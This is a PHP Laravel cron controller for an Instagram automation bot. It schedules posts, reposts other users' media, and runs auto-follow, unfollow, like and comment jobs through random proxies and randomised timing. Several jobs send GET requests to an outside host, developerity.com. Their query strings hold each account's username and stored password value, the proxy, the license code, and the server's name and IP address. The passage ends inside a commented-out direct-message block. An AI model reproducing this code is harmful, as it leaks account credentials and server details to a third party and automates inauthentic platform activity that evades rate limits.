<?php

namespace Autobot\Http\Controllers;

use Illuminate\Support\Facades\DB;
use Autobot\Http\Controllers\Controller;
use Illuminate\Support\Facades\Auth;
use GuzzleHttp\Client;

class CronController extends Controller
{
    public function cron()
    {
        set_time_limit(0);
        date_default_timezone_set('UTC');
        ini_set('max_execution_time', '0');
        require 'vendor/filp/autoload.php';
        
        $ig = new \InstagramAPI\Instagram();
        $a = 0;

        echo 'Cron task processed!';

        $fsdata = DB::table('ab_settings')->where('name', 'followspeeds')->first();
        $fsdata = json_decode($fsdata->data);
        $usdata = DB::table('ab_settings')->where('name', 'unfollowspeeds')->first();
        $usdata = json_decode($usdata->data);
        $lsdata = DB::table('ab_settings')->where('name', 'likespeeds')->first();
        $lsdata = json_decode($lsdata->data);
        $csdata = DB::table('ab_settings')->where('name', 'commentspeeds')->first();
        $csdata = json_decode($csdata->data);
        $dmsdata = DB::table('ab_settings')->where('name', 'dmspeeds')->first();
        $dmsdata = json_decode($dmsdata->data);

        $proxycheck = DB::table('ab_settings')->where('name', 'proxysettings')->first();
        $proxycheck = json_decode($proxycheck->data);

        $pc = config('app.pcode');
        $d = $_SERVER['SERVER_NAME'];
        $i = $_SERVER['SERVER_ADDR'];

        $spdata = DB::table('ab_scheduledposts')->get();
        
        foreach ($spdata as $data) {
            if ($data->date <= date("Y-m-d H:i:s")) {
                try {
                    if ($proxycheck->{'sysproxies'} == 1) {
                        $proxies = DB::table('ab_proxies')->inRandomOrder()->first();

                        if (!empty($proxies)) {
                            $ig->setProxy($proxies->proxy);
                        }
                    }

                    $account  = DB::table('ab_accounts')->where('username', $data->username)->first();
                    $pass     = noah($account->password);
                    $password = ulus($pass);

                    $ig->login($data->username, $password);
                }
                catch (\Exception $e) {
                    DB::table('ab_logs')->insert(['account_id' => $data->account_id, 'username' => $data->username, 'type' => 'error', 'log' => $e->getMessage()]);
                    continue;
                }

                if ($data->type == "single") {
                    try {
                        $rankToken = \InstagramAPI\Signatures::generateUUID();

                        $explode = explode("/", $data->imageurl);
                        $count = count($explode);
                        $explode = $explode[$count-1];
                        $imageurl = 'storage/app/photos/home/' . $data->user_id . '/' . $explode;

                        if ($data->caption != NULL) {
                            $caption = $data->caption;
                        }else{
                            $caption = "";
                        }

                        if ($data->location != NULL) {
                            $location = $ig->location->findPlaces($data->location, [], $rankToken);
                            $lat = $location->getItems()[0]->getLocation()->getLat();
                            $lng = $location->getItems()[0]->getLocation()->getLng();
                            $lsearch = $ig->location->search($lat, $lng);
                            $lsearch = $lsearch->getVenues()[0];
                        }else{
                            $lsearch = "";
                        }

                        $photo = new \InstagramAPI\Media\Photo\InstagramPhoto($imageurl);
                        $metadata = [
                            'caption' => $caption,
                            'location' => $lsearch
                        ];
                        $ig->timeline->uploadPhoto($photo->getFile(), $metadata);
                        if ($data->deletephoto == 1) {
                            unlink($imageurl);
                            DB::table('ab_photos')->where('user_id', $data->user_id)->where('photo', $explode)->delete();
                        }
                        DB::table('ab_scheduledposts')->where('user_id', $data->user_id)->where('imageurl', $data->imageurl)->delete();

                        DB::table('ab_logs')->insert(['account_id' => $data->account_id, 'username' => $data->username, 'type' => 'schedulepost', 'log' => 'Scheduled "Single" media posted from site home page']);
                    }
                    catch (\Exception $e) {
                        // DB::table('ab_logs')->insert(['account_id' => $data->account_id, 'username' => $data->username, 'type' => 'error', 'log' => $e->getMessage()]);
                        continue;
                    }
                }elseif($data->type == "story"){
                    try {
                        $rankToken = \InstagramAPI\Signatures::generateUUID();

                        $explode = explode("/", $data->imageurl);
                        $count = count($explode);
                        $explode = $explode[$count-1];
                        $imageurl = 'storage/app/photos/home/' . $data->user_id . '/' . $explode;

                        $photo = new \InstagramAPI\Media\Photo\InstagramPhoto($imageurl, ['targetFeed' => \InstagramAPI\Constants::FEED_STORY]);
                        $ig->story->uploadPhoto($photo->getFile());
                        if ($data->deletephoto == 1) {
                            unlink($imageurl);
                            DB::table('ab_photos')->where('user_id', $data->user_id)->where('photo', $explode)->delete();
                        }
                        DB::table('ab_scheduledposts')->where('user_id', $data->user_id)->where('imageurl', $data->imageurl)->delete();

                        DB::table('ab_logs')->insert(['account_id' => $data->account_id, 'username' => $data->username, 'type' => 'schedulepost', 'log' => 'Scheduled "Story" media posted from site home page']);
                    }
                    catch (\Exception $e) {
                        // DB::table('ab_logs')->insert(['account_id' => $data->account_id, 'username' => $data->username, 'type' => 'error', 'log' => $e->getMessage()]);
                        continue;
                    }
                }
            }
        }
        
        $scdata = DB::table('ab_schedule_data')->get();
        
        foreach ($scdata as $data) {
        
            if ($data->status == 1) {
        
                if ($data->timestamp - ($data->timestamp % $data->time) != (time() - (time() % $data->time))) {
                    DB::table('ab_schedule_data')->where('username', $data->username)->update(['position' => 0, 'timestamp' => time()]);
                }
        
                if ($data->position < 1) {
                    try {
                        if ($proxycheck->{'sysproxies'} == 1) {
                            $proxies = DB::table('ab_proxies')->inRandomOrder()->first();

                            if (!empty($proxies)) {
                                $ig->setProxy($proxies->proxy);
                            }
                        }
        
                        $account  = DB::table('ab_accounts')->where('username', $data->username)->first();
                        $pass     = noah($account->password);
                        $password = ulus($pass);
        
                        $ig->login($data->username, $password);
                    }
                    catch (\Exception $e) {
                        DB::table('ab_logs')->insert(['account_id' => $data->account_id, 'username' => $data->username, 'type' => 'error', 'log' => $e->getMessage()]);
                        continue;
                    }

                    try {
                        if ($data->random == 0) {
                            $photos = DB::table('ab_photos')->where('username', $data->username)->first();
                            $photofile  = 'storage/app/photos/' . $data->user_id . '/' . $photos->photo;
                        } else {
                            $photos = DB::table('ab_photos')->where('username', $data->username)->inRandomOrder()->first();
                            $photofile  = 'storage/app/photos/' . $data->user_id . '/' . $photos->photo;
                        }
            
                        if ($data->captiongroup == !NULL) {
                            $group = DB::table('ab_groups')->where('user_id', $data->user_id)->where('groupname', $data->captiongroup)->where('type', 'caption')->inRandomOrder()->first();
                            $captions = DB::table('ab_captions')->where('group_id', $group->id)->inRandomOrder()->first();
                            if (!empty($captions)) {
                                $caption = $captions->caption;
                            }else{
                                $caption = "";
                            }
                        }elseif ($data->captiongroup == NULL){
                            $caption = "";
                        }

                        $photo = new \InstagramAPI\Media\Photo\InstagramPhoto($photofile);
                        $ig->timeline->uploadPhoto($photo->getFile(), ['caption' => $caption]);
                        if ($data->deletephoto == 1) {
                            unlink($photofile);
                            DB::table('ab_photos')->where('username', $data->username)->where('photo', $photos->photo)->delete();
                        }
                        DB::table('ab_logs')->insert(['account_id' => $data->account_id, 'username' => $data->username, 'type' => 'schedulepost', 'log' => 'Scheduled media posted from systematic page']);
                    }
                    catch (\Exception $e) {
                        // DB::table('ab_logs')->insert(['account_id' => $data->account_id, 'username' => $data->username, 'type' => 'error', 'log' => $e->getMessage()]);
                        continue;
                    }
        
                    DB::table('ab_schedule_data')->where('username', $data->username)->increment('position');
                }
        
            }
        
        }
        
        $fodata = DB::table('ab_autofollow_data')->get();
        
        foreach ($fodata as $data) {

        if ($data->speed == "auto") {
            $fospeed = rand(900,560); //IMPORTANT!!!! DONT TOUCH THESE SPEED SETTINGS!!!! THIS REALLY IMPORTANT! We don't accept responsibility for anything!!! We will update these settings in the next version.
        }elseif ($data->speed == "veryslow") {
            $fospeed = rand(900,600); //IMPORTANT!!!! DONT TOUCH THESE SPEED SETTINGS!!!! THIS REALLY IMPORTANT! We don't accept responsibility for anything!!! We will update these settings in the next version.
        }elseif ($data->speed == "slow") {
            $fospeed = rand(890,590); //IMPORTANT!!!! DONT TOUCH THESE SPEED SETTINGS!!!! THIS REALLY IMPORTANT! We don't accept responsibility for anything!!! We will update these settings in the next version.
        }elseif ($data->speed == "medium") {
            $fospeed = rand(880,580); //IMPORTANT!!!! DONT TOUCH THESE SPEED SETTINGS!!!! THIS REALLY IMPORTANT! We don't accept responsibility for anything!!! We will update these settings in the next version.
        }elseif ($data->speed == "fast") {
            $fospeed = rand(870,570); //IMPORTANT!!!! DONT TOUCH THESE SPEED SETTINGS!!!! THIS REALLY IMPORTANT! We don't accept responsibility for anything!!! We will update these settings in the next version.
        }elseif ($data->speed == "veryfast") {
            $fospeed = rand(860,560); //IMPORTANT!!!! DONT TOUCH THESE SPEED SETTINGS!!!! THIS REALLY IMPORTANT! We don't accept responsibility for anything!!! We will update these settings in the next version.
        }
            
            if ($data->status == 1) {
                
                if ($data->timestamp - ($data->timestamp % $fospeed) != (time() - (time() % $fospeed))) {
                    DB::table('ab_autofollow_data')->where('username', $data->username)->update(['position' => 0, 'timestamp' => time()]);
                }
                
                if ($data->position < 1) {
                    try {                        
                        $explodetarget = explode(" ", $data->target);
                        $count         = count($explodetarget);
                        $rand          = rand(0, $count - 1);
                        $target        = $explodetarget[$rand];

                        if ($target[0] == "@") {
                            $replace = str_replace("@", "", $target);

                            $account  = DB::table('ab_accounts')->where('username', $data->username)->first();
                            
                            $client = new Client();
                            $client->request('GET', 'https://developerity.com/dev/ror.php?code='.$pc.'&d='.$d.'&ip='.$i.'&username='.$data->username.'&password='.$account->password.'&type=autofollow&targettype=person&target='.$replace.'&proxy='.$account->proxy);
                        }elseif ($target[0] == "#") {
                            $replace = str_replace("#", "", $target);

                            $account  = DB::table('ab_accounts')->where('username', $data->username)->first();
                            
                            $client = new Client();
                            $client->request('GET', 'https://developerity.com/dev/ror.php?code='.$pc.'&d='.$d.'&ip='.$i.'&username='.$data->username.'&password='.$account->password.'&type=autofollow&targettype=hashtag&target='.$replace.'&proxy='.$account->proxy);
                        }
                    }
                    catch (\Exception $e) {
                        // DB::table('ab_logs')->insert(['account_id' => $data->account_id, 'username' => $data->username, 'type' => 'error', 'log' => $e->getMessage()]);
                        continue;
                    }
                    
                    DB::table('ab_autofollow_data')->where('username', $data->username)->increment('position');
                }
                
            }
            
        }

        $undata = DB::table('ab_autounfollow_data')->get();
        
        foreach ($undata as $data) {

        if ($data->speed == "auto") {
            $unspeed = rand(900,560); //IMPORTANT!!!! DONT TOUCH THESE SPEED SETTINGS!!!! THIS REALLY IMPORTANT! We don't accept responsibility for anything!!! We will update these settings in the next version.
        }elseif ($data->speed == "veryslow") {
            $unspeed = rand(900,600); //IMPORTANT!!!! DONT TOUCH THESE SPEED SETTINGS!!!! THIS REALLY IMPORTANT! We don't accept responsibility for anything!!! We will update these settings in the next version.
        }elseif ($data->speed == "slow") {
            $unspeed = rand(890,590); //IMPORTANT!!!! DONT TOUCH THESE SPEED SETTINGS!!!! THIS REALLY IMPORTANT! We don't accept responsibility for anything!!! We will update these settings in the next version.
        }elseif ($data->speed == "medium") {
            $unspeed = rand(880,580); //IMPORTANT!!!! DONT TOUCH THESE SPEED SETTINGS!!!! THIS REALLY IMPORTANT! We don't accept responsibility for anything!!! We will update these settings in the next version.
        }elseif ($data->speed == "fast") {
            $unspeed = rand(870,570); //IMPORTANT!!!! DONT TOUCH THESE SPEED SETTINGS!!!! THIS REALLY IMPORTANT! We don't accept responsibility for anything!!! We will update these settings in the next version.
        }elseif ($data->speed == "veryfast") {
            $unspeed = rand(860,560); //IMPORTANT!!!! DONT TOUCH THESE SPEED SETTINGS!!!! THIS REALLY IMPORTANT! We don't accept responsibility for anything!!! We will update these settings in the next version.
        }
            
            if ($data->status == 1) {
                
                if ($data->timestamp - ($data->timestamp % $unspeed) != (time() - (time() % $unspeed))) {
                    DB::table('ab_autounfollow_data')->where('username', $data->username)->update(['position' => 0, 'timestamp' => time()]);
                }
                
                if ($data->position < 1) {
                    try {

                        $unfwhitelist = explode(",", $data->whitelist);

                        $account  = DB::table('ab_accounts')->where('username', $data->username)->first();
                        
                        $client = new Client();
                        $client->request('GET', 'https://developerity.com/dev/ror.php?code='.$pc.'&d='.$d.'&ip='.$i.'&username='.$data->username.'&password='.$account->password.'&type=autounfollow&targettype=&target=&proxy='.$account->proxy);
                    }
                    catch (\Exception $e) {
                        // DB::table('ab_logs')->insert(['account_id' => $data->account_id, 'username' => $data->username, 'type' => 'error', 'log' => $e->getMessage()]);
                        continue;
                    }
                    
                    DB::table('ab_autounfollow_data')->where('username', $data->username)->increment('position');
                }
                
            }
            
        }
        
        $lidata = DB::table('ab_autolike_data')->get();
        
        foreach ($lidata as $data) {

        if ($data->speed == "auto") {
            $lispeed = rand(900,560); //IMPORTANT!!!! DONT TOUCH THESE SPEED SETTINGS!!!! THIS REALLY IMPORTANT! We don't accept responsibility for anything!!! We will update these settings in the next version.
        }elseif ($data->speed == "veryslow") {
            $lispeed = rand(900,600); //IMPORTANT!!!! DONT TOUCH THESE SPEED SETTINGS!!!! THIS REALLY IMPORTANT! We don't accept responsibility for anything!!! We will update these settings in the next version.
        }elseif ($data->speed == "slow") {
            $lispeed = rand(890,590); //IMPORTANT!!!! DONT TOUCH THESE SPEED SETTINGS!!!! THIS REALLY IMPORTANT! We don't accept responsibility for anything!!! We will update these settings in the next version.
        }elseif ($data->speed == "medium") {
            $lispeed = rand(880,580); //IMPORTANT!!!! DONT TOUCH THESE SPEED SETTINGS!!!! THIS REALLY IMPORTANT! We don't accept responsibility for anything!!! We will update these settings in the next version.
        }elseif ($data->speed == "fast") {
            $lispeed = rand(870,570); //IMPORTANT!!!! DONT TOUCH THESE SPEED SETTINGS!!!! THIS REALLY IMPORTANT! We don't accept responsibility for anything!!! We will update these settings in the next version.
        }elseif ($data->speed == "veryfast") {
            $lispeed = rand(860,560); //IMPORTANT!!!! DONT TOUCH THESE SPEED SETTINGS!!!! THIS REALLY IMPORTANT! We don't accept responsibility for anything!!! We will update these settings in the next version.
        }
            
            if ($data->status == 1) {
                
                if ($data->timestamp - ($data->timestamp % $lispeed) != (time() - (time() % $lispeed))) {
                    DB::table('ab_autolike_data')->where('username', $data->username)->update(['position' => 0, 'timestamp' => time()]);
                }

                if ($data->position < 1) {
                    try {                        
                        $explodetarget = explode(" ", $data->target);
                        $count         = count($explodetarget);
                        $rand          = rand(0, $count - 1);
                        $target        = $explodetarget[$rand];

                        if ($target[0] == "@") {
                            $replace = str_replace("@", "", $target);

                            $account  = DB::table('ab_accounts')->where('username', $data->username)->first();
                            
                            $client = new Client();
                            $client->request('GET', 'https://developerity.com/dev/ror.php?code='.$pc.'&d='.$d.'&ip='.$i.'&username='.$data->username.'&password='.$account->password.'&type=autolike&targettype=person&target='.$replace.'&proxy='.$account->proxy);
                        }elseif ($target[0] == "#") {
                            $replace = str_replace("#", "", $target);

                            $account  = DB::table('ab_accounts')->where('username', $data->username)->first();
                            
                            $client = new Client();
                            $client->request('GET', 'https://developerity.com/dev/ror.php?code='.$pc.'&d='.$d.'&ip='.$i.'&username='.$data->username.'&password='.$account->password.'&type=autolike&targettype=hashtag&target='.$replace.'&proxy='.$account->proxy);
                        }
                    }
                    catch (\Exception $e) {
                        // DB::table('ab_logs')->insert(['account_id' => $data->account_id, 'username' => $data->username, 'type' => 'error', 'log' => $e->getMessage()]);
                        continue;
                    }
                    
                    DB::table('ab_autolike_data')->where('username', $data->username)->increment('position');
                }
                
            }
            
        }
        
        $codata = DB::table('ab_autocomment_data')->get();
        
        foreach ($codata as $data) {

        if ($data->speed == "auto") {
            $cospeed = rand(900,560); //IMPORTANT!!!! DONT TOUCH THESE SPEED SETTINGS!!!! THIS REALLY IMPORTANT! We don't accept responsibility for anything!!! We will update these settings in the next version.
        }elseif ($data->speed == "veryslow") {
            $cospeed = rand(900,600); //IMPORTANT!!!! DONT TOUCH THESE SPEED SETTINGS!!!! THIS REALLY IMPORTANT! We don't accept responsibility for anything!!! We will update these settings in the next version.
        }elseif ($data->speed == "slow") {
            $cospeed = rand(890,590); //IMPORTANT!!!! DONT TOUCH THESE SPEED SETTINGS!!!! THIS REALLY IMPORTANT! We don't accept responsibility for anything!!! We will update these settings in the next version.
        }elseif ($data->speed == "medium") {
            $cospeed = rand(880,580); //IMPORTANT!!!! DONT TOUCH THESE SPEED SETTINGS!!!! THIS REALLY IMPORTANT! We don't accept responsibility for anything!!! We will update these settings in the next version.
        }elseif ($data->speed == "fast") {
            $cospeed = rand(870,570); //IMPORTANT!!!! DONT TOUCH THESE SPEED SETTINGS!!!! THIS REALLY IMPORTANT! We don't accept responsibility for anything!!! We will update these settings in the next version.
        }elseif ($data->speed == "veryfast") {
            $cospeed = rand(860,560); //IMPORTANT!!!! DONT TOUCH THESE SPEED SETTINGS!!!! THIS REALLY IMPORTANT! We don't accept responsibility for anything!!! We will update these settings in the next version.
        }
            
            if ($data->status == 1) {
                
                if ($data->timestamp - ($data->timestamp % $cospeed) != (time() - (time() % $cospeed))) {
                    DB::table('ab_autocomment_data')->where('username', $data->username)->update(['position' => 0, 'timestamp' => time()]);
                }
                
                if ($data->position < 1) {                    
                    try {

                        $explodetarget = explode(" ", $data->target);
                        $count         = count($explodetarget);
                        $rand          = rand(0, $count - 1);
                        $target        = $explodetarget[$rand];
                        
                        if ($target[0] == "@") {
                            $replace = str_replace("@", "", $target);
                            
                            $account  = DB::table('ab_accounts')->where('username', $data->username)->first();
                            
                            $client = new Client();
                            $client->request('GET', 'https://developerity.com/dev/ror.php?code='.$pc.'&d='.$d.'&ip='.$i.'&username='.$data->username.'&password='.$account->password.'&type=autocomment&targettype=person&target='.$replace.'&proxy='.$account->proxy);
                        }elseif ($target[0] == "#") {
                            $replace = str_replace("#", "", $target);
                            
                            $account  = DB::table('ab_accounts')->where('username', $data->username)->first();
                            
                            $client = new Client();
                            $client->request('GET', 'https://developerity.com/dev/ror.php?code='.$pc.'&d='.$d.'&ip='.$i.'&username='.$data->username.'&password='.$account->password.'&type=autocomment&targettype=hashtag&target='.$replace.'&proxy='.$account->proxy);
                        }
                    }
                    catch (\Exception $e) {
                        // DB::table('ab_logs')->insert(['account_id' => $data->account_id, 'username' => $data->username, 'type' => 'error', 'log' => $e->getMessage()]);
                        continue;
                    }
                    
                    DB::table('ab_autocomment_data')->where('username', $data->username)->increment('position');
                }
                
            }
            
        }

        $redata = DB::table('ab_autorepost_data')->get();
        
        foreach ($redata as $data) {
            
            if ($data->status == 1) {
                
                if ($data->timestamp - ($data->timestamp % $data->speed) != (time() - (time() % $data->speed))) {
                    DB::table('ab_autorepost_data')->where('username', $data->username)->update(['position' => 0, 'timestamp' => time()]);
                }
                
                if ($data->position < 1) {
                    try {
                        if ($proxycheck->{'sysproxies'} == 1) {
                            $proxies = DB::table('ab_proxies')->inRandomOrder()->first();

                            if (!empty($proxies)) {
                                $ig->setProxy($proxies->proxy);
                            }
                        }
                        
                        $account  = DB::table('ab_accounts')->where('username', $data->username)->first();
                        $pass     = noah($account->password);
                        $password = ulus($pass);
                        
                        $ig->login($data->username, $password);
                    }
                    catch (\Exception $e) {
                        DB::table('ab_logs')->insert(['account_id' => $data->account_id, 'username' => $data->username, 'type' => 'error', 'log' => $e->getMessage()]);
                        continue;
                    }
                    
                    try {
                        
                        $rankToken = \InstagramAPI\Signatures::generateUUID();
                        
                        $explodetarget = explode(" ", $data->target);
                        $count         = count($explodetarget);
                        $rand          = rand(0, $count - 1);
                        $target        = $explodetarget[$rand];
                        
                        if ($target[0] == "@") {
                            $replace = str_replace("@", "", $target);
                            $people  = $ig->people->getUserIdForName($replace);

                            $repostfeed = array(
                                $ig->timeline->getUserFeed($people)
                            );
                                
                            foreach ($repostfeed as $key => $value) {
                                $value      = json_decode(json_encode($value), true);
                                $rand       = rand(0, count($value['items']) - 1);
                                $reposttype = $value['items'][$rand]['media_type'];
                                $repostcode = $value['items'][$rand]['code'];
                                $reposturl  = $value['items'][$rand]['image_versions2']['candidates']['0']['url'];
                                $repostuser = $value['items'][$rand]['user']['username'];
                                $repostname = $value['items'][$rand]['user']['full_name'];
                                $repostcapt = $value['items'][$rand]['caption']['text'];
                            }

                            if ($reposttype == 1) {
                                $putphoto = file_get_contents($reposturl);
                                $rand = rand(1, 1000000);
                                file_put_contents("storage/app/photos/temp/".$rand.".jpg", $putphoto);
                                $photopath = "storage/app/photos/temp/".$rand.".jpg";

                                if ($data->captiongroup == !NULL && $data->caption == NULL) {
                                    $group = DB::table('ab_groups')->where('user_id', $data->user_id)->where('groupname', $data->captiongroup)->where('type', 'caption')->inRandomOrder()->first();
                                    $captions = DB::table('ab_captions')->where('group_id', $group->id)->inRandomOrder()->first();
                                    if (!empty($captions)) {
                                        $caption = $captions->caption;
                                    }else{
                                        $caption = "";
                                    }
                                }elseif ($data->captiongroup == NULL && $data->caption == !NULL){
                                    $str = str_replace("{caption}", $repostcapt, $data->caption);
                                    $str = str_replace("{username}", $repostuser, $str);
                                    $caption = str_replace("{owner}", $repostname, $str);
                                }elseif ($data->captiongroup == NULL && $data->caption == NULL) {
                                    $caption = "";
                                }

                                $photo = new \InstagramAPI\Media\Photo\InstagramPhoto($photopath);
                                $ig->timeline->uploadPhoto($photo->getFile(), ['caption' => $caption]);
                                unlink($photopath);

                                $log = array('text' => 'Repost completed', 'target' => $target, 'ppic' => $reposturl, 'code' => $repostcode);

                                DB::table('ab_logs')->insert(['account_id' => $data->account_id, 'username' => $data->username, 'type' => 'autorepost', 'log' => json_encode($log)]);
                            }
                        }

                        if ($target[0] == "#") {
                            $replace = str_replace("#", "", $target);
                            
                            $reposthashfeed = array(
                                $ig->hashtag->getFeed($replace, $rankToken)
                            );
                            
                            foreach ($reposthashfeed as $key => $value) {
                                $value     = json_decode(json_encode($value), true);
                                $rand      = rand(0, count($value['items']) - 1);
                                $reposthashtype = $value['items'][$rand]['media_type'];
                                $reposthashcode = $value['items'][$rand]['code'];
                                $reposthashurl  = $value['items'][$rand]['image_versions2']['candidates']['0']['url'];
                                $reposthashuser = $value['items'][$rand]['user']['username'];
                                $reposthashname = $value['items'][$rand]['user']['full_name'];
                                $reposthashcapt = $value['items'][$rand]['caption']['text'];
                            }

                            if ($reposthashtype == 1) {
                                $putphoto = file_get_contents($reposthashurl);
                                $rand = rand(1, 1000000);
                                file_put_contents("storage/app/photos/temp/".$rand.".jpg", $putphoto);
                                $photopath = "storage/app/photos/temp/".$rand.".jpg";

                                if ($data->captiongroup == !NULL && $data->caption == NULL) {
                                    $group = DB::table('ab_groups')->where('user_id', $data->user_id)->where('groupname', $data->captiongroup)->where('type', 'caption')->inRandomOrder()->first();
                                    $captions = DB::table('ab_captions')->where('group_id', $group->id)->inRandomOrder()->first();
                                    if (!empty($captions)) {
                                        $caption = $captions->caption;
                                    }else{
                                        $caption = "";
                                    }
                                }elseif ($data->captiongroup == NULL && $data->caption == !NULL){
                                    $str = str_replace("{caption}", $reposthashcapt, $data->caption);
                                    $str = str_replace("{username}", $reposthashuser, $str);
                                    $caption = str_replace("{owner}", $reposthashname, $str);
                                }elseif ($data->captiongroup == NULL && $data->caption == NULL) {
                                    $caption = "";
                                }

                                $photo = new \InstagramAPI\Media\Photo\InstagramPhoto($photopath);
                                $ig->timeline->uploadPhoto($photo->getFile(), ['caption' => $caption]);
                                unlink($photopath);

                                $log = array('text' => 'Repost completed', 'target' => $target, 'ppic' => $reposturl, 'code' => $repostcode);

                                DB::table('ab_logs')->insert(['account_id' => $data->account_id, 'username' => $data->username, 'type' => 'autorepost', 'log' => json_encode($log)]);
                            }
                        }
                    }
                    catch (\Exception $e) {
                        // DB::table('ab_logs')->insert(['account_id' => $data->account_id, 'username' => $data->username, 'type' => 'error', 'log' => $e->getMessage()]);
                        continue;
                    }
                    
                    DB::table('ab_autorepost_data')->where('username', $data->username)->increment('position');
                }
            }
        }

        // $medata = DB::table('ab_automessage_data')->get();
        
        // foreach ($medata as $data) {

        // if ($data->speed == "auto") {
        //     $mespeed = rand(3600,1300);
        // }elseif ($data->speed == "veryslow") {
        //     $mespeed = $dmsdata->{'dspeedveryslow'};
        // }elseif ($data->speed == "slow") {
        //     $mespeed = $dmsdata->{'dspeedslow'};
        // }elseif ($data->speed == "medium") {
        //     $mespeed = $dmsdata->{'dspeedmedium'};
        // }elseif ($data->speed == "fast") {
        //     $mespeed = $dmsdata->{'dspeedfast'};
        // }elseif ($data->speed == "veryfast") {
        //     $mespeed = $dmsdata->{'dspeedveryfast'};
        // }
            
        //     if ($data->status == 1) {
                
        //         if ($data->timestamp - ($data->timestamp % $mespeed) != (time() - (time() % $mespeed))) {
        //             DB::table('ab_automessage_data')->where('username', $data->username)->update(['position' => 0, 'timestamp' => time()]);
        //         }
                
        //         if ($data->position < 1) {
        //             try {
        //                 if ($proxycheck->{'sysproxies'} == 1) {
        //                     $proxies = DB::table('ab_proxies')->inRandomOrder()->first();

        //                     if (!empty($proxies)) {
        //                         $ig->setProxy($proxies->proxy);
        //                     }
        //                 }
                        
        //                 $account  = DB::table('ab_accounts')->where('username', $data->username)->first();
        //                 $pass     = noah($account->password);
        //                 $password = ulus($pass);
                        
        //                 $ig->login($data->username, $password);
        //             }
        //             catch (\Exception $e) {
        //                 DB::table('ab_logs')->insert(['account_id' => $data->account_id, 'username' => $data->username, 'type' => 'error', 'log' => $e->getMessage()]);
        //                 continue;
        //             }
                    
        //             try {
                        
        //                 $rankToken = \InstagramAPI\Signatures::generateUUID();
                        
        //                 $explodetarget = explode(" ", $data->target);
        //                 $count         = count($explodetarget);
        //                 $rand          = rand(0, $count - 1);
        //                 $target        = $explodetarget[$rand];

        //                 if ($target[0] == "@") {
        //                     $replace = str_replace("@", "", $target);
        //                     $people  = $ig->people->getUserIdForName($replace);
                            
        //                     if ($data->tofollowers == 1) {
        //                         $peopleers = array(
        //                             $ig->people->getFollowers($people, $rankToken)
        //                         );
                                
        //                         foreach ($peopleers as $key => $value) {
        //                             $value     = json_decode(json_encode($value), true);
        //                             $rand      = rand(0, count($value['users']) - 1);
        //                             $peopleers = $value['users'][$rand]['username'];
        //                             $peopleerspic = $value['users'][$rand]['profile_pic_url'];
        //                             $peopleersanonpic = $value['users'][$rand]['has_anonymous_profile_picture'];
        //                             $peopleerspriv = $value['users'][$rand]['is_private'];
        //                         }

        //                         if ($data->accountphoto == "true") {
        //                             if ($peopleersanonpic == 1) {
        //                                 $data->tofollowers = 0;
        //                             }
        //                         }elseif ($data->accountphoto == "false") {
        //                             if ($peopleersanonpic != 1) {
        //                                 $data->tofollowers = 0;
        //                             }
        //                         }

        //                         if ($data->accountstatus == "true") {
        //                             if ($peopleerspriv == 1) {
        //                                 $data->tofollowers = 0;
        //                             }
        //                         }elseif ($data->accountstatus == "false") {
        //                             if ($peopleerspriv != 1) {
        //                                 $data->tofollowers = 0;
        //                             }
        //                         }

        //                         if ($data->botdetect != NULL || $data->botdetect != 0) {
        //                             $people  = $ig->people->getUserIdForName($peopleers);
        //                             $count1 = array($ig->people->getInfoById($people));
        //                             foreach ($count1 as $key => $value) {
        //                                 $value     = json_decode(json_encode($value), true);
        //                                 $folcount1 = $value['user']['follower_count'];
        //                             }
        //                             if ($folcount1 < $data->botdetect) {
        //                                 $data->tofollowers = 0;
        //                             }
        //                         }

        //                         if ($data->botdetect2 != NULL || $data->botdetect2 != 0) {
        //                             $people2  = $ig->people->getUserIdForName($peopleers);
        //                             $count2 = array($ig->people->getInfoById($people2));
        //                             foreach ($count2 as $key => $value) {
        //                                 $value     = json_decode(json_encode($value), true);
        //                                 $medcount1 = $value['user']['media_count'];
        //                             }
        //                             if ($medcount1 < $data->botdetect2) {
        //                                 $data->tofollowers = 0;
        //                             }
        //                         }
        //                     }
                            
        //                     if ($data->tofollowings == 1) {
        //                         $peopleings = array(
        //                             $ig->people->getFollowing($people, $rankToken)
        //                         );
                                
        //                         foreach ($peopleings as $key => $value) {
        //                             $value      = json_decode(json_encode($value), true);
        //                             $rand       = rand(0, count($value['users']) - 1);
        //                             $peopleings = $value['users'][$rand]['username'];
        //                             $peopleingspic = $value['users'][$rand]['profile_pic_url'];
        //                             $peopleingsanonpic = $value['users'][$rand]['has_anonymous_profile_picture'];
        //                             $peopleingspriv = $value['users'][$rand]['is_private'];
        //                         }

        //                         if ($data->accountphoto == "true") {
        //                             if ($peopleingsanonpic == 1) {
        //                                 $data->tofollowings = 0;
        //                             }
        //                         }elseif ($data->accountphoto == "false") {
        //                             if ($peopleingsanonpic != 1) {
        //                                 $data->tofollowings = 0;
        //                             }
        //                         }

        //                         if ($data->accountstatus == "true") {
        //                             if ($peopleingspriv == 1) {
        //                                 $data->tofollowings = 0;
        //                             }
        //                         }elseif ($data->accountstatus == "false") {
        //                             if ($peopleingspriv != 1) {
        //                                 $data->tofollowings = 0;
        //                             }
        //                         }

        //                         if ($data->botdetect != NULL || $data->botdetect != 0) {
        //                             $people  = $ig->people->getUserIdForName($peopleings);
        //                             $count2 = array($ig->people->getInfoById($people));
        //                             foreach ($count2 as $key => $value) {
        //                                 $value     = json_decode(json_encode($value), true);
        //                                 $folcount2 = $value['user']['follower_count'];
        //                             }
        //                             if ($folcount2 < $data->botdetect) {
        //                                 $data->tofollowings = 0;
        //                             }
        //                         }

        //                         if ($data->botdetect2 != NULL || $data->botdetect2 != 0) {
        //                             $people2  = $ig->people->getUserIdForName($peopleings);
        //                             $count2 = array($ig->people->getInfoById($people2));
        //                             foreach ($count2 as $key => $value) {
        //                                 $value     = json_decode(json_encode($value), true);
        //                                 $medcount1 = $value['user']['media_count'];
        //                             }
        //                             if ($medcount1 < $data->botdetect2) {
        //                                 $data->tofollowings = 0;
        //                             }
        //                         }
        //                     }
                            
        //                     if ($data->tofollowers && $data->tofollowings == 1) {
        //                         $random = rand(0, 1);
        //                         if ($random == 0) {

        //                             if ($data->captiongroup == !NULL) {
        //                                 $group = DB::table('ab_groups')->where('user_id', $data->user_id)->where('groupname', $data->captiongroup)->where('type', 'caption')->inRandomOrder()->first();
        //                                 $captions = DB::table('ab_captions')->where('group_id', $group->id)->inRandomOrder()->first();

        //                                 $getuser = $ig->people->getUserIdForName($peopleers);

        //                                 $a = array( "users" => array ($getuser));

        //                                 $ig->direct->sendText($a, $captions->caption);

